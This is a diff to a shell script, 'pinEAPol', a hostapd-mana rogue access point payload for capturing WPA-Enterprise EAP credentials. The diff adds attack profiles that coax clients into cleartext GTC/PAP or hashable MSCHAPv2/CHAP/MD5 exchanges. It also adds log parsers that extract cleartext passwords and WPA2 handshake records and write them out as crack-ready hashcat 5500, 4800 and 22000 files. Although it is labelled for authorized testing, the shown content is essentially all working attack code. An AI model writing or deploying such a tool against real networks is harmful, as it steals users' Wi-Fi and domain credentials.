@@ -2,7 +2,7 @@
 # Title: pinEAPol
 # Author: R4g3D
 # Description: Pager-native hostapd-mana orchestrator for authorized WPA-Enterprise EAP credential capture
-# Version: 3.6
+# Version: 3.7
 # Requires: openssl-util, iw, net-tools-ifconfig; tcpdump optional; monitor/AP-capable radio
 # Category: user/capture
 # Based on VENOM by sinXneo.
@@ -54,6 +54,7 @@ PAYLOAD_DIR=$(resolve_payload_dir)
 PINEAPOL_HOME="/root/loot/pineapol"
 LOOT_DIR="$PINEAPOL_HOME/sessions"
 PERSISTENT_CONFIG_DIR="$PINEAPOL_HOME/config"
+FAST_PAC_KEY_FILE="$PERSISTENT_CONFIG_DIR/fast-pac-opaque.key"
 EAP_PROFILE_DIR="$PERSISTENT_CONFIG_DIR/eap-profiles"
 HOSTAPD_CACHE_DIR="$PINEAPOL_HOME/bin"
 CERT_STORE="$PINEAPOL_HOME/certificates"
@@ -81,6 +82,7 @@ HOSTAPD_LOG=""
 MANA_CREDOUT=""
 TCPDUMP_PCAP=""
 TCPDUMP_LOG=""
+HOSTAPD_CTRL_DIR=""
 
 # Rogue AP settings
 PINEAPOL_IFACE="wlan_pineapol"
@@ -135,6 +137,9 @@ CLEANUP_ACTIVE=0
 IDENTITY_COUNT=0
 CLEARTEXT_COUNT=0
 MSCHAPV2_COUNT=0
+CHAP_COUNT=0
+WPA2_HASH_COUNT=0
+TLS_EVIDENCE_COUNT=0
 
 # Session tracking
 SESSION_DIR=""
@@ -470,6 +475,7 @@ initialize_persistent_storage() {
     TCPDUMP_START_FILE="$RUNTIME_DIR/tcpdump.start"
     PAYLOAD_PID_FILE="$RUNTIME_LOCK_DIR/payload.pid"
     PAYLOAD_START_FILE="$RUNTIME_LOCK_DIR/payload.start"
+    FAST_PAC_KEY_FILE="$PERSISTENT_CONFIG_DIR/fast-pac-opaque.key"
 
     mkdir -p "$LOOT_DIR" "$PERSISTENT_CONFIG_DIR" "$EAP_PROFILE_DIR" \
         "$HOSTAPD_CACHE_DIR" "$CERT_STORE" "$RUNTIME_DIR" || return 1
@@ -477,6 +483,7 @@ initialize_persistent_storage() {
         "$HOSTAPD_CACHE_DIR" "$CERT_STORE" "$RUNTIME_DIR" 2>/dev/null
 
     acquire_runtime_lock || return 1
+    cleanup_all_stale_parse_staging
 
     local target_slug
     target_slug=$(safe_slug "${TARGET_SSID:-unselected}")
@@ -488,8 +495,10 @@ initialize_persistent_storage() {
     SESSION_CAPTURE_DIR="$SESSION_DIR/captures"
     SESSION_RESULTS_DIR="$SESSION_DIR/results"
     SESSION_WORK_DIR="$SESSION_DIR/work"
+    HOSTAPD_CTRL_DIR="$SESSION_WORK_DIR/hostapd-control"
     mkdir -p "$SESSION_CONFIG_DIR" "$SESSION_LOG_DIR" "$SESSION_CAPTURE_DIR" \
-        "$SESSION_RESULTS_DIR" "$SESSION_WORK_DIR" || return 1
+        "$SESSION_RESULTS_DIR" "$SESSION_WORK_DIR" "$HOSTAPD_CTRL_DIR" || return 1
+    chmod 700 "$HOSTAPD_CTRL_DIR" 2>/dev/null
 
     HOSTAPD_CONF="$SESSION_CONFIG_DIR/hostapd.conf"
     EAP_USER_FILE="$SESSION_CONFIG_DIR/eap_users"
@@ -503,6 +512,40 @@ initialize_persistent_storage() {
     ln -sfn "$SESSION_DIR" "$CURRENT_LINK" 2>/dev/null
     echo "$(date '+%Y-%m-%d %H:%M:%S') pinEAPol session created" > "$SESSION_LOG"
     return 0
+}
+
+ensure_fast_pac_key() {
+    local pac_key=""
+    local error_log="${SESSION_LOG:-/dev/null}"
+
+    if [ -f "$FAST_PAC_KEY_FILE" ]; then
+        IFS= read -r pac_key < "$FAST_PAC_KEY_FILE" || true
+        case "$pac_key" in
+            *[!0-9A-Fa-f]*|'') pac_key="" ;;
+        esac
+        [ "$(printf '%s' "$pac_key" | wc -c | tr -d ' ')" = 32 ] || pac_key=""
+    fi
+
+    if [ -z "$pac_key" ]; then
+        if ! command -v dd >/dev/null 2>&1 || ! command -v openssl >/dev/null 2>&1; then
+            logboth red "Cannot generate EAP-FAST PAC key: dd or openssl is unavailable"
+            return 1
+        fi
+        # Do not use BusyBox hexdump here: some Pager builds format a short
+        # result despite dd reading a full block. openssl dgst is already used
+        # by this payload and yields stable hexadecimal text.
+        pac_key=$(dd if=/dev/urandom bs=32 count=1 2>/dev/null | \
+            openssl dgst -sha256 2>> "$error_log" | awk '{print $NF}' | cut -c 1-32)
+        case "$pac_key" in
+            *[!0-9A-Fa-f]*|'') logboth red "Could not generate EAP-FAST PAC key"; return 1 ;;
+        esac
+        [ "$(printf '%s' "$pac_key" | wc -c | tr -d ' ')" = 32 ] || {
+            logboth red "Could not generate EAP-FAST PAC key"
+            return 1
+        }
+        printf '%s\n' "$pac_key" > "$FAST_PAC_KEY_FILE" || return 1
+        chmod 600 "$FAST_PAC_KEY_FILE" 2>/dev/null
+    fi
 }
 
 rename_session_for_target() {
@@ -662,6 +705,24 @@ cleanup_watchdog_main() {
     case "$config_file" in
         "$PINEAPOL_HOME"/sessions/*/config/hostapd.conf)
             session_dir=${config_file%/config/hostapd.conf}
+            # A UI/process-group termination bypasses the normal harvest path.
+            # Publish the evidence that hostapd-mana has already written before
+            # clearing runtime state, so an interrupted run remains useful.
+            SESSION_DIR="$session_dir"
+            SESSION_LOG_DIR="$session_dir/logs"
+            SESSION_RESULTS_DIR="$session_dir/results"
+            SESSION_WORK_DIR="$session_dir/work"
+            HOSTAPD_LOG="$SESSION_LOG_DIR/hostapd.log"
+            MANA_CREDOUT="$SESSION_LOG_DIR/mana-credentials.log"
+            mkdir -p "$SESSION_RESULTS_DIR" "$SESSION_WORK_DIR" 2>/dev/null
+            if parse_credentials "$HOSTAPD_LOG" "$SESSION_RESULTS_DIR"; then
+                printf '%s Detached watchdog evidence publication complete\n' \
+                    "$(date '+%Y-%m-%d %H:%M:%S')" >> "$session_dir/logs/session.log" 2>/dev/null
+            else
+                printf '%s Detached watchdog evidence publication failed; raw logs preserved\n' \
+                    "$(date '+%Y-%m-%d %H:%M:%S')" >> "$session_dir/logs/session.log" 2>/dev/null
+            fi
+            cleanup_stale_parse_staging "$SESSION_WORK_DIR"
             printf '%s Detached watchdog cleanup complete\n' \
                 "$(date '+%Y-%m-%d %H:%M:%S')" >> "$session_dir/logs/session.log" 2>/dev/null
             ;;
@@ -1169,6 +1230,14 @@ check_deps() {
         logboth green "    - ifconfig found"
     fi
 
+    logboth "  - Checking for hostapd_cli..."
+    if ! command -v hostapd_cli >/dev/null 2>&1; then
+        logboth red "    - hostapd_cli not found"
+        missing=1
+    else
+        logboth green "    - hostapd_cli found"
+    fi
+
     logboth "  - Checking for tcpdump..."
     if ! command -v tcpdump >/dev/null 2>&1; then
         logboth yellow "    - tcpdump not found (optional)"
@@ -1189,8 +1258,8 @@ Attempt auto-install?")
             local sid=$(START_SPINNER "Installing packages...")
             logboth "  - Updating opkg..."
             opkg update >/dev/null 2>&1
-            logboth "  - Installing openssl-util, iw, iwinfo, ifconfig, and tcpdump..."
-            opkg install openssl-util iw iwinfo net-tools-ifconfig tcpdump >/dev/null 2>&1
+            logboth "  - Installing openssl-util, iw, iwinfo, ifconfig, hostapd-utils, and tcpdump..."
+            opkg install openssl-util iw iwinfo net-tools-ifconfig hostapd-utils tcpdump >/dev/null 2>&1
             STOP_SPINNER $sid
 
             logboth "  - Verifying installation..."
@@ -1230,6 +1299,16 @@ opkg install net-tools-ifconfig"
                 return 1
             else
                 logboth green "    - ifconfig installed"
+            fi
+            if ! command -v hostapd_cli >/dev/null 2>&1; then
+                logboth red "    - hostapd_cli install failed"
+                ERROR_DIALOG "hostapd_cli install failed
+
+Run manually:
+opkg install hostapd-utils"
+                return 1
+            else
+                logboth green "    - hostapd_cli installed"
             fi
             LOG green "Packages installed"
         else
@@ -2728,50 +2807,44 @@ write_eap_user_file() {
     case "$EAP_PROFILE" in
         broad)
             cat > "$EAP_USER_FILE" << 'EAPEOF'
-# Phase 1 - Outer Tunnel (any identity matches)
-* PEAP,TTLS,TLS,FAST,MD5
+# Every outer method that can carry a MANA WPE credential exchange. The dummy
+# password is required by direct MD5/MSCHAPv2/GTC and is ignored by TLS/tunnels.
+* MD5,GTC,MSCHAPV2,TTLS,PEAP,FAST,TLS "password"
 
 # Phase 2 - MANA WPE rewrites the lookup identity to "t".
-# The dummy password permits MSCHAPv2 challenge/response capture; unknown
-# passwords are not expected to authenticate successfully.
-"t" MD5,MSCHAPV2,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2 "password" [2]
+# These are every credential-bearing inner method supported by the bundled
+# MANA WPE build. The dummy password permits challenge-response capture;
+# unknown passwords are not expected to authenticate successfully.
+"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5,MSCHAPV2 "password" [2]
 EAPEOF
             ;;
-        peap-mschapv2)
+        peap-mschapv2|peap-gtc|peap-md5)
+            local peap_inner
+            case "$EAP_PROFILE" in
+                peap-mschapv2) peap_inner="MSCHAPV2" ;;
+                peap-gtc) peap_inner="GTC" ;;
+                peap-md5) peap_inner="MD5" ;;
+            esac
             cat > "$EAP_USER_FILE" << 'EAPEOF'
 * PEAP [ver=0]
-"t" MSCHAPV2 "password" [2]
 EAPEOF
+            printf '"t" %s "password" [2]\n' "$peap_inner" >> "$EAP_USER_FILE"
             ;;
-        peap-gtc)
-            cat > "$EAP_USER_FILE" << 'EAPEOF'
-* PEAP [ver=0]
-"t" GTC "password" [2]
-EAPEOF
-            ;;
-        ttls-pap)
-            cat > "$EAP_USER_FILE" << 'EAPEOF'
-* TTLS
-"t" TTLS-PAP "password" [2]
-EAPEOF
-            ;;
-        ttls-chap)
+        ttls-eap-md5|ttls-eap-gtc|ttls-eap-mschapv2|ttls-mschapv2|ttls-mschap|ttls-pap|ttls-chap)
+            local ttls_inner
+            case "$EAP_PROFILE" in
+                ttls-eap-md5) ttls_inner="MD5" ;;
+                ttls-eap-gtc) ttls_inner="GTC" ;;
+                ttls-eap-mschapv2) ttls_inner="MSCHAPV2" ;;
+                ttls-mschapv2) ttls_inner="TTLS-MSCHAPV2" ;;
+                ttls-mschap) ttls_inner="TTLS-MSCHAP" ;;
+                ttls-pap) ttls_inner="TTLS-PAP" ;;
+                ttls-chap) ttls_inner="TTLS-CHAP" ;;
+            esac
             cat > "$EAP_USER_FILE" << 'EAPEOF'
 * TTLS
-"t" TTLS-CHAP "password" [2]
 EAPEOF
-            ;;
-        ttls-mschap)
-            cat > "$EAP_USER_FILE" << 'EAPEOF'
-* TTLS
-"t" TTLS-MSCHAP "password" [2]
-EAPEOF
-            ;;
-        ttls-mschapv2)
-            cat > "$EAP_USER_FILE" << 'EAPEOF'
-* TTLS
-"t" TTLS-MSCHAPV2 "password" [2]
-EAPEOF
+            printf '"t" %s "password" [2]\n' "$ttls_inner" >> "$EAP_USER_FILE"
             ;;
         eap-tls)
             cat > "$EAP_USER_FILE" << 'EAPEOF'
@@ -2783,21 +2856,31 @@ EAPEOF
 * TLS
 EAPEOF
             ;;
-        fast)
+        fast-mschapv2|fast-gtc)
+            local fast_inner
+            case "$EAP_PROFILE" in
+                fast-mschapv2) fast_inner="MSCHAPV2" ;;
+                fast-gtc) fast_inner="GTC" ;;
+            esac
             cat > "$EAP_USER_FILE" << 'EAPEOF'
 * FAST
-"t" MSCHAPV2,GTC "password" [2]
 EAPEOF
+            printf '"t" %s "password" [2]\n' "$fast_inner" >> "$EAP_USER_FILE"
             ;;
-        md5)
+        md5|mschapv2|gtc)
+            local direct_method
+            case "$EAP_PROFILE" in
+                md5) direct_method="MD5" ;;
+                mschapv2) direct_method="MSCHAPV2" ;;
+                gtc) direct_method="GTC" ;;
+            esac
             cat > "$EAP_USER_FILE" << 'EAPEOF'
-* MD5 "password"
 EAPEOF
+            printf '* %s "password"\n' "$direct_method" >> "$EAP_USER_FILE"
             ;;
         *)
-            EAP_PROFILE="broad"
-            write_eap_user_file
-            return $?
+            logboth red "Unsupported EAP profile: $EAP_PROFILE"
+            return 1
             ;;
     esac
 
@@ -2813,35 +2896,41 @@ EAPEOF
 
 eap_profile_label() {
     case "$1" in
+        broad) printf '%s' "Broad / automatic" ;;
         peap-mschapv2) printf '%s' "PEAP + MSCHAPv2 [hash]" ;;
         peap-gtc) printf '%s' "PEAP + GTC [cleartext]" ;;
+        peap-md5) printf '%s' "PEAP + MD5 [hash]" ;;
+        ttls-eap-md5) printf '%s' "TTLS + EAP-MD5 [hash]" ;;
+        ttls-eap-gtc) printf '%s' "TTLS + EAP-GTC [cleartext]" ;;
+        ttls-eap-mschapv2) printf '%s' "TTLS + EAP-MSCHAPv2 [hash]" ;;
         ttls-pap) printf '%s' "TTLS + PAP [cleartext]" ;;
         ttls-chap) printf '%s' "TTLS + CHAP [hash]" ;;
         ttls-mschap) printf '%s' "TTLS + MSCHAPv1 [hash]" ;;
         ttls-mschapv2) printf '%s' "TTLS + MSCHAPv2 [hash]" ;;
         eap-tls) printf '%s' "EAP-TLS [certificate]" ;;
         eap-tls-accept-any) printf '%s' "EAP-TLS [accept client cert]" ;;
-        fast) printf '%s' "FAST + MSCHAPv2/GTC" ;;
+        fast-mschapv2) printf '%s' "FAST + MSCHAPv2 [hash]" ;;
+        fast-gtc) printf '%s' "FAST + GTC [cleartext]" ;;
         md5) printf '%s' "EAP-MD5" ;;
-        *) printf '%s' "Broad / automatic" ;;
+        mschapv2) printf '%s' "EAP-MSCHAPv2 [hash]" ;;
+        gtc) printf '%s' "EAP-GTC [cleartext]" ;;
+        *) printf '%s' "Invalid EAP profile" ;;
     esac
 }
 
 select_eap_profile() {
-    local selected default_label
+    local selected default_label inner_selected
     local help_option="Help choosing a profile"
+    local back_option="Back"
     local options=(
         "Broad / automatic"
-        "PEAP + MSCHAPv2 [hash]"
-        "PEAP + GTC [cleartext]"
-        "TTLS + PAP [cleartext]"
-        "TTLS + CHAP [hash]"
-        "TTLS + MSCHAPv1 [hash]"
-        "TTLS + MSCHAPv2 [hash]"
-        "EAP-TLS [certificate]"
-        "EAP-TLS [accept client cert]"
-        "FAST + MSCHAPv2/GTC"
+        "PEAP"
+        "TTLS"
+        "FAST"
+        "EAP-TLS"
         "EAP-MD5"
+        "EAP-MSCHAPv2"
+        "EAP-GTC"
         "$help_option"
     )
     default_label=$(eap_profile_label "$EAP_PROFILE")
@@ -2853,28 +2942,68 @@ select_eap_profile() {
                 PROMPT "EAP PROFILE HELP
 
 Broad: lets the client negotiate.
-PEAP/MSCHAPv2: captures a challenge-response hash.
-GTC and TTLS/PAP: may expose cleartext credentials.
-TTLS/MSCHAPv2: captures a challenge-response hash.
-TTLS/CHAP and TTLS/MSCHAPv1: legacy challenge-response methods.
-EAP-TLS: client certificate authentication; no password.
-EAP-TLS accept client cert: accepts any presented client certificate; use only
-to test client-certificate authentication in explicitly authorized scope.
-FAST: permits MSCHAPv2 or GTC.
-MD5: legacy challenge-response.
+Select PEAP, TTLS, or FAST to choose a compatible inner method next.
+PEAP: MSCHAPv2, GTC, or MD5.
+TTLS: EAP-MD5, EAP-GTC, EAP-MSCHAPv2, MSCHAPv2, MSCHAPv1, PAP, or CHAP.
+FAST: MSCHAPv2 or GTC; collectable output depends on the client and MANA build.
+EAP-TLS has no password exchange; it can optionally accept a presented client
+certificate for an explicitly authorized client-certificate test.
+Direct EAP-MD5, EAP-MSCHAPv2, and EAP-GTC have no inner method.
+Choose Back from an inner-method list to return here without changing the profile.
 
 Press OK to return."
                 ;;
-            "PEAP + MSCHAPv2 [hash]") EAP_PROFILE="peap-mschapv2"; break ;;
-            "PEAP + GTC [cleartext]") EAP_PROFILE="peap-gtc"; break ;;
-            "TTLS + PAP [cleartext]") EAP_PROFILE="ttls-pap"; break ;;
-            "TTLS + CHAP [hash]") EAP_PROFILE="ttls-chap"; break ;;
-            "TTLS + MSCHAPv1 [hash]") EAP_PROFILE="ttls-mschap"; break ;;
-            "TTLS + MSCHAPv2 [hash]") EAP_PROFILE="ttls-mschapv2"; break ;;
-            "EAP-TLS [certificate]") EAP_PROFILE="eap-tls"; break ;;
-            "EAP-TLS [accept client cert]") EAP_PROFILE="eap-tls-accept-any"; break ;;
-            "FAST + MSCHAPv2/GTC") EAP_PROFILE="fast"; break ;;
+            "PEAP")
+                inner_selected=$(ui_list_picker "PEAP Inner Method" "MSCHAPv2 [hash]" \
+                    "MSCHAPv2 [hash]" "GTC [cleartext]" "MD5 [hash]" "$back_option") || return 1
+                case "$inner_selected" in
+                    "MSCHAPv2 [hash]") EAP_PROFILE="peap-mschapv2" ;;
+                    "GTC [cleartext]") EAP_PROFILE="peap-gtc" ;;
+                    "MD5 [hash]") EAP_PROFILE="peap-md5" ;;
+                    "$back_option") continue ;;
+                esac
+                break
+                ;;
+            "TTLS")
+                inner_selected=$(ui_list_picker "TTLS Inner Method" "MSCHAPv2 [hash]" \
+                    "EAP-MD5 [hash]" "EAP-GTC [cleartext]" "EAP-MSCHAPv2 [hash]" \
+                    "MSCHAPv2 [hash]" "MSCHAPv1 [hash]" "PAP [cleartext]" "CHAP [hash]" \
+                    "$back_option") || return 1
+                case "$inner_selected" in
+                    "EAP-MD5 [hash]") EAP_PROFILE="ttls-eap-md5" ;;
+                    "EAP-GTC [cleartext]") EAP_PROFILE="ttls-eap-gtc" ;;
+                    "EAP-MSCHAPv2 [hash]") EAP_PROFILE="ttls-eap-mschapv2" ;;
+                    "MSCHAPv2 [hash]") EAP_PROFILE="ttls-mschapv2" ;;
+                    "MSCHAPv1 [hash]") EAP_PROFILE="ttls-mschap" ;;
+                    "PAP [cleartext]") EAP_PROFILE="ttls-pap" ;;
+                    "CHAP [hash]") EAP_PROFILE="ttls-chap" ;;
+                    "$back_option") continue ;;
+                esac
+                break
+                ;;
+            "FAST")
+                inner_selected=$(ui_list_picker "FAST Inner Method" "MSCHAPv2 [hash]" \
+                    "MSCHAPv2 [hash]" "GTC [cleartext]" "$back_option") || return 1
+                case "$inner_selected" in
+                    "MSCHAPv2 [hash]") EAP_PROFILE="fast-mschapv2" ;;
+                    "GTC [cleartext]") EAP_PROFILE="fast-gtc" ;;
+                    "$back_option") continue ;;
+                esac
+                break
+                ;;
+            "EAP-TLS")
+                inner_selected=$(ui_list_picker "EAP-TLS Mode" "Verify client certificate" \
+                    "Verify client certificate" "Accept presented client certificate" "$back_option") || return 1
+                case "$inner_selected" in
+                    "Verify client certificate") EAP_PROFILE="eap-tls" ;;
+                    "Accept presented client certificate") EAP_PROFILE="eap-tls-accept-any" ;;
+                    "$back_option") continue ;;
+                esac
+                break
+                ;;
             "EAP-MD5") EAP_PROFILE="md5"; break ;;
+            "EAP-MSCHAPv2") EAP_PROFILE="mschapv2"; break ;;
+            "EAP-GTC") EAP_PROFILE="gtc"; break ;;
             "Broad / automatic") EAP_PROFILE="broad"; break ;;
         esac
     done
@@ -2888,6 +3017,7 @@ write_hostapd_config() {
     local ssid="$1"
     local channel="$2"
     local mana_eaptls=0
+    local fast_pac_key=""
 
     logboth "Configuring hostapd for SSID: '$ssid'"
 
@@ -2916,6 +3046,13 @@ write_hostapd_config() {
     case "$EAP_PROFILE" in
         eap-tls-accept-any)
             mana_eaptls=1
+            ;;
+    esac
+
+    case "$EAP_PROFILE" in
+        broad|fast-mschapv2|fast-gtc)
+            ensure_fast_pac_key || return 1
+            IFS= read -r fast_pac_key < "$FAST_PAC_KEY_FILE" || true
             ;;
     esac
 
@@ -2950,6 +3087,8 @@ logger_syslog=-1
 logger_syslog_level=0
 logger_stdout=-1
 logger_stdout_level=0
+ctrl_interface=$HOSTAPD_CTRL_DIR
+ctrl_interface_group=0
 
 # MANA WPE capture. Karma and forced success remain disabled. Accepting an
 # arbitrary EAP-TLS client certificate is enabled only by its explicit profile.
@@ -2968,10 +3107,13 @@ ieee80211n=0
 HOSTAPDEOF
 
     case "$EAP_PROFILE" in
-        broad|fast)
+        broad|fast-mschapv2|fast-gtc)
             cat >> "$HOSTAPD_CONF" << 'HOSTAPDFASTEOF'
 
 # EAP-FAST Provisioning
+HOSTAPDFASTEOF
+            printf 'pac_opaque_encr_key=%s\n' "$fast_pac_key" >> "$HOSTAPD_CONF"
+            cat >> "$HOSTAPD_CONF" << 'HOSTAPDFASTEOF'
 eap_fast_a_id=101112131415161718191a1b1c1d1e1f
 eap_fast_a_id_info=hostapd
 eap_fast_prov=3
@@ -3334,6 +3476,34 @@ extract_mana_hashcat_hostapd() {
     ' "$log_file"
 }
 
+# A completed WPA-EAP connection can also make hostapd-mana emit a native
+# Hashcat 22000 WPA record. It is separate from the EAP credential writers and
+# is available only on hostapd stdout, so preserve it when present rather than
+# leaving a crack-ready hash stranded in the debug log.
+extract_mana_hashcat_22000_hostapd() {
+    local log_file="$1"
+    [ -f "$log_file" ] || return 0
+
+    awk '
+        index($0, "MANA WPA2 HASHCAT | ") {
+            record = $0
+            sub(/.*MANA WPA2 HASHCAT \| /, "", record)
+            count = split(record, fields, "\\*")
+            if (count < 9 || fields[1] != "WPA" || fields[2] !~ /^0[12]$/) next
+            if (length(fields[3]) != 32 || length(fields[4]) != 12 ||
+                length(fields[5]) != 12 || length(fields[9]) != 2 ||
+                fields[3] !~ /^[0-9A-Fa-f]+$/ ||
+                fields[4] !~ /^[0-9A-Fa-f]+$/ ||
+                fields[5] !~ /^[0-9A-Fa-f]+$/ ||
+                fields[6] !~ /^[0-9A-Fa-f]+$/ ||
+                fields[7] !~ /^[0-9A-Fa-f]+$/ ||
+                fields[8] !~ /^[0-9A-Fa-f]+$/ ||
+                fields[9] !~ /^[0-9A-Fa-f]+$/) next
+            print record
+        }
+    ' "$log_file"
+}
+
 extract_mana_cleartext() {
     local cred_file="$1"
     [ -f "$cred_file" ] || return 0
@@ -3351,6 +3521,46 @@ extract_mana_cleartext() {
                 print source "\t" user "\t" password
         }
     ' "$cred_file"
+}
+
+# The WPE plaintext format is also emitted to hostapd stdout immediately:
+# "MANA EAP <method> | <username>:<value>". Restrict this to GTC and PAP so
+# unrelated debug values are never misclassified as authentication data.
+extract_mana_cleartext_hostapd() {
+    local log_file="$1"
+    [ -f "$log_file" ] || return 0
+
+    awk '
+        index($0, "MANA EAP ") && index($0, " | ") &&
+        $0 !~ /(ASLEAP|JTR|HASHCAT)/ {
+            line = $0
+            sub(/.*MANA EAP /, "", line)
+            marker = index(line, " | ")
+            if (!marker) next
+            source = substr(line, 1, marker - 1)
+            if (source !~ /(GTC|PAP)/) next
+            record = substr(line, marker + 3)
+            separator = index(record, ":")
+            if (!separator) next
+            user = substr(record, 1, separator - 1)
+            password = substr(record, separator + 1)
+            if (user != "" && password != "")
+                print source "\t" user "\t" password
+        }
+    ' "$log_file"
+}
+
+# EAP-TLS does not expose a password. Preserve certificate-related diagnostics
+# separately when hostapd/OpenSSL emits them, without claiming that every TLS
+# diagnostic denotes a presented client certificate. The raw debug log and PCAP
+# remain the authoritative record of the complete TLS exchange.
+extract_tls_evidence() {
+    local log_file="$1"
+    [ -f "$log_file" ] || return 0
+
+    grep -Ei \
+        'EAP-TLS|TLS:.*(peer|client|certificate|cert|subject|issuer|serial|fingerprint)|((peer|client)[[:space:]-]*certificate|certificate[[:space:]-]*(subject|issuer|serial|fingerprint))' \
+        "$log_file" 2>/dev/null | sed '/^$/d'
 }
 
 extract_mana_chap() {
@@ -3371,6 +3581,33 @@ extract_mana_chap() {
                     tolower(fields[2]) "\t" tolower(fields[3])
         }
     ' "$cred_file"
+}
+
+# MANA emits the same legacy challenge-response record to hostapd's immediate
+# stdout before its credential file necessarily flushes. This covers MD5 and
+# TTLS-CHAP/MSCHAP records during live monitoring and interrupted sessions.
+extract_mana_chap_hostapd() {
+    local log_file="$1"
+    [ -f "$log_file" ] || return 0
+
+    awk '
+        /MANA EAP .* HASHCAT user=.* \| / {
+            line = $0
+            sub(/.*MANA EAP /, "", line)
+            if (split(line, parts, " HASHCAT user=") != 2) next
+            source = parts[1]
+            if (split(parts[2], parts, " \\| ") != 2) next
+            user = parts[1]
+            split(parts[2], fields, ":")
+            if (user != "" && length(fields[1]) == 32 &&
+                length(fields[2]) == 32 && length(fields[3]) == 2 &&
+                fields[1] ~ /^[0-9A-Fa-f]+$/ &&
+                fields[2] ~ /^[0-9A-Fa-f]+$/ &&
+                fields[3] ~ /^[0-9A-Fa-f]+$/)
+                print source "\t" user "\t" tolower(fields[1]) "\t" \
+                    tolower(fields[2]) "\t" tolower(fields[3])
+        }
+    ' "$log_file"
 }
 
 extract_mana_identities() {
@@ -3447,10 +3684,15 @@ parse_eap_sessions() {
             else if (/EAP Response-TTLS|EAP-TTLS/) { outer[sta] = "TTLS"; emit("outer-method", "") }
             else if (/EAP Response-FAST|EAP-FAST/) { outer[sta] = "FAST"; emit("outer-method", "") }
             else if (/EAP Response-TLS|EAP-TLS/) { outer[sta] = "TLS"; emit("outer-method", "") }
-            else if (/EAP Response-MD5|EAP-MD5/) { outer[sta] = "MD5"; emit("outer-method", "") }
+            else if (/EAP Response-MD5/ || (outer[sta] == "" && /EAP-MD5/)) { outer[sta] = "MD5"; emit("outer-method", "") }
+            else if (outer[sta] == "" && /EAP-MSCHAPV2|MSCHAPV2/) { outer[sta] = "MSCHAPV2"; emit("outer-method", "") }
+            else if (outer[sta] == "" && /EAP-GTC|[^A-Za-z]GTC[^A-Za-z]/) { outer[sta] = "GTC"; emit("outer-method", "") }
 
-            if (/EAP-MSCHAPV2|MSCHAPV2/) { inner[sta] = "MSCHAPV2"; emit("inner-method", "") }
-            else if (/EAP-GTC|[^A-Za-z]GTC[^A-Za-z]/) { inner[sta] = "GTC"; emit("inner-method", "") }
+            if (outer[sta] != "MSCHAPV2" && /EAP-MSCHAPV2|MSCHAPV2/) { inner[sta] = "MSCHAPV2"; emit("inner-method", "") }
+            else if (/TTLS-MSCHAP([^V]|$)|TTLS\/MSCHAP([^V]|$)/) { inner[sta] = "MSCHAPV1"; emit("inner-method", "") }
+            else if (/TTLS-CHAP|TTLS\/CHAP/) { inner[sta] = "CHAP"; emit("inner-method", "") }
+            else if (outer[sta] != "MD5" && /EAP-MD5/) { inner[sta] = "MD5"; emit("inner-method", "") }
+            else if (outer[sta] != "GTC" && /EAP-GTC|[^A-Za-z]GTC[^A-Za-z]/) { inner[sta] = "GTC"; emit("inner-method", "") }
             else if (/TTLS\/PAP|TTLS-PAP/) { inner[sta] = "PAP"; emit("inner-method", "") }
 
             if (/CTRL-EVENT-EAP-SUCCESS/) emit("authentication-result", "success")
@@ -3527,40 +3769,136 @@ publish_unique_lines_atomic() {
     mv "$candidate" "$destination"
 }
 
-parse_credentials() {
+publish_mana_chap_records_atomic() {
+    local destination="$1"
+    local records="$2"
+    local candidate="${destination}.new.$$"
+
+    {
+        printf 'method\tusername\thash\tsalt\tid\n'
+        printf '%s\n' "$records" | sed '/^$/d' | sort -u
+    } > "$candidate" || return 1
+    chmod 600 "$candidate" 2>/dev/null
+    mv "$candidate" "$destination"
+}
+
+publish_tabular_records_atomic() {
+    local destination="$1"
+    local header="$2"
+    local records="$3"
+    local candidate="${destination}.new.$$"
+
+    {
+        printf '%s\n' "$header"
+        printf '%s\n' "$records" | sed '/^$/d' | sort -u
+    } > "$candidate" || return 1
+    chmod 600 "$candidate" 2>/dev/null
+    mv "$candidate" "$destination"
+}
+
+# Hashcat mode 4800 (iSCSI CHAP authentication) accepts the same
+# response:challenge:identifier representation emitted by MANA for EAP-MD5
+# and TTLS-CHAP. The raw MANA credential log retains method and username context.
+chap_records_to_hashcat_4800() {
+    awk -F '\t' '
+        $1 !~ /MSCHAP/ && $1 ~ /(MD5|CHAP)/ &&
+        length($3) == 32 && length($4) == 32 && length($5) == 2 {
+            print $3 ":" $4 ":" $5
+        }
+    '
+}
+
+format_cleartext_records() {
+    awk -F '\t' 'NF >= 2 && $1 != "" && $2 != "" { print "[" $1 "] " $2 }'
+}
+
+cleanup_stale_parse_staging() {
+    local staging_root="$1"
+    local candidate pid
+
+    [ -d "$staging_root" ] || return 0
+    for candidate in "$staging_root"/.parse.*; do
+        [ -d "$candidate" ] || continue
+        pid=${candidate##*.parse.}
+        case "$pid" in
+            *[!0-9]*|'') continue ;;
+        esac
+        # Never touch a staging directory that could still belong to a live
+        # parser. PID reuse can leave a stale directory behind temporarily,
+        # which is safer than deleting an active parser's work.
+        kill -0 "$pid" 2>/dev/null && continue
+        rm -rf -- "$candidate"
+    done
+}
+
+cleanup_all_stale_parse_staging() {
+    local work_dir
+
+    for work_dir in "$LOOT_DIR"/*/work; do
+        [ -d "$work_dir" ] || continue
+        cleanup_stale_parse_staging "$work_dir"
+    done
+}
+
+remove_parse_staging() {
+    local staging_dir="$1"
+    [ -n "$staging_dir" ] && [ -d "$staging_dir" ] || return 0
+    rm -rf -- "$staging_dir"
+}
+
+parse_credentials() (
     local log_file="$1"
     local output_dir="$2"
 
     # Build a complete result generation out of sight, then atomically publish
     # each file. Readers therefore see the previous complete generation until
     # its replacement is ready, never a truncated or half-populated file.
-    local staging_dir="$output_dir/.parse.$$"
+    local staging_root="${SESSION_WORK_DIR:-}"
+    if [ -z "$staging_root" ]; then
+        staging_root="$(dirname "$output_dir")/work"
+    fi
+    local staging_dir="$staging_root/.parse.$$"
     local identities_file="$staging_dir/identities.txt"
-    local cleartext_file="$staging_dir/cleartext_creds.tsv"
+    local cleartext_file="$staging_dir/cleartext.txt"
     local mschapv2_file="$staging_dir/mschapv2_raw.tsv"
     local hashcat_file="$staging_dir/hashcat_5500.txt"
+    local hashcat_chap_file="$staging_dir/hashcat_4800.txt"
+    local hashcat_wpa_file="$staging_dir/hashcat_22000.txt"
     local debug_hashcat_file="$staging_dir/hashcat_5500.debug"
